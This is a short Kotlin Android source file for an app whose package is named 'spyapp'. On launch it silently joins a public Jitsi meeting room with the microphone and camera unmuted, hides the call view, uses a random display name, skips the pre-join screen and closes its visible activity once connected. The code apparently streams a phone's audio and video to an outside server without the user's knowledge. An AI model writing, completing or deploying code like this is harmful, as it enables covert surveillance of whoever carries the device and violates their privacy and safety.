package com.pozetech.spyapp

import android.os.Bundle
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import com.facebook.react.modules.core.PermissionListener
import com.pozetech.spyapp.databinding.ActivityMainBinding
import org.jitsi.meet.sdk.*
import java.net.URL
import java.util.*


class MainActivity : AppCompatActivity(), JitsiMeetActivityInterface {
    private lateinit var binding: ActivityMainBinding
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        val randomName = UUID.randomUUID().toString()
        val jitsiUser = JitsiMeetUserInfo()
        jitsiUser.displayName = randomName

        val view = JitsiMeetView(this@MainActivity)
        val option = JitsiMeetConferenceOptions.Builder()
            .setServerURL(URL("https://meet.jit.si/aasdjghfsdljgdshgk#config.prejoinPageEnabled=false"))
            .setRoom("mySpyRoom")
            .setAudioMuted(false)
            .setVideoMuted(false)
            .setUserInfo(jitsiUser)
            .build()
        view.join(option)
        view.visibility = View.INVISIBLE
        view.listener = object : JitsiMeetViewListener {
            override fun onConferenceJoined(p0: MutableMap<String, Any>?) {
                this@MainActivity.finish()
            }

            override fun onConferenceTerminated(p0: MutableMap<String, Any>?) {

            }

            override fun onConferenceWillJoin(p0: MutableMap<String, Any>?) {

            }

        }
        setContentView(view)

    }

    override fun requestPermissions(p0: Array<out String>?, p1: Int, p2: PermissionListener?) {

    }
}